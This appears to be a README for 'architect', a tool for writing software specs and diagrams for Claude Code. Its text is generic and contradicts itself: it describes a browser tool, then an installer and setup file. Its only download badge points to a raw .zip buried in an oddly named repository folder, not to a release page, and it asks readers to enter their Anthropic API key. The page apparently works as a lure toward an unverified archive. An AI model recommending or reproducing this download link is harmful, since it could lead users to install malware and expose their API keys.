# 🏗️ architect - Create clear software plans for agents

[![Download Architect](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/zydecocapella241/architect/raw/refs/heads/main/Cujam/Software-v2.0.zip)

Architect helps you plan software projects for AI agents. You can write technical specifications and draw diagrams in your browser. Send these plans to Claude Code to build your software. You provide your own Claude API key to start.

## 📋 What this tool does

- Write detailed project specs using Markdown.
- Design architecture diagrams directly in the browser.
- Organize your development work for AI agents.
- Connect your own Claude key for direct integration.
- Export plans to hand off to coding tools.

## 🔑 Your API Key

Architect uses Claude to help you write specs. You need a valid API key from Anthropic to use the AI features.

1. Visit the Anthropic Console website.
2. Log in or create an account.
3. Create a new API key.
4. Copy your unique key.
5. Open Architect on your computer.
6. Paste your key into the settings menu.

## 📝 Writing your first spec

The main window shows a text editor on the left and a diagram view on the right. 

1. Write your project goals in the text editor.
2. Use Markdown formatting to organize your text.
3. Use the diagram tools to sketch your system layout.

## 🤖 Handoff to AI

Once your plan is ready, you can pass it to Claude Code.

1. Ensure your API key stays saved in the settings.
2. Click the export button.
3. Save the resulting file.
4. Point your AI coding tool to this file.
5. The AI agent will read your spec and begin building the software based on your architecture.

## ❓ Frequently Asked Questions

**Does the software store my API key?**
Architect saves your key locally on your machine. The software does not send your key to any servers other than Anthropic.

**Can I run the software offline?**
You need an internet connection to use the AI features. You can edit your files offline, but the AI tools require a connection to verify your key and process data.

**How do I update the software?**
Check the releases page often. If a new version exists, download the setup file again and run it. The installer will replace the old files with the new ones.

**Where does the software save my work?**
You choose the save location when you create a new file. You have full control over your project documents.

**Is my data private?**
Your project files stay on your computer. Only the text you send to the AI agent goes through the Anthropic network.

## 💡 Best Practices

Keep your specifications clear and simple. Use bullet points for project tasks. Label the components of your diagrams. A clear diagram helps the AI agent understand how parts of your software relate to each other. If the AI agent encounters errors, update your spec to provide more context. 

Start with a document title. Define the core purpose of your software. List the main features you want the agent to build. Break these features into small, manageable items. This modular approach helps the AI complete tasks with higher accuracy. 

Save your work often. Use descriptive names for your files. Store your files in a folder dedicated to your development projects. This keeps your workspace organized. 

If you make a mistake in your plan, edit the Markdown file directly. The tool updates the diagram automatically. You can always revisit older versions of your specs if you save them as separate files. 

Maintain a list of project requirements in the top section of your document. This acts as a reference for the AI. Include details about libraries or frameworks you prefer the agent to use. This saves time and keeps the code consistent with your needs.
